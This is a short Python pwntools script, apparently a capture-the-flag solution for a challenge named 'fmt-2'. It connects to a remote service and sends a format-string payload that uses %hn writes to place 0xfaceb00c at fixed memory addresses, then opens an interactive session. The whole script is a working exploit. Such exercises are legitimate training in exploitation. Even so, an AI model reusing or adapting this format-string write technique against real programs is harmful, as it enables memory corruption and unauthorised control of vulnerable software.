from pwn import *

context.binary = 'fmt-2'
r = remote('140.110.112.77', 4003)
#r = process('fmt-2')
raw_input('debug:')
payload = '%{}c'.format(0xb00c) + '%10$hn' + '%{}c'.format(0xface - 0xb00c) + '%11$hn'
payload += 'a' * (8 - (len(payload) % 8))
print(len(payload))
payload += p64(0x404050) + p64(0x404052) 
print(payload)
r.recvuntil('Input:')
r.sendline(payload)
r.interactive()
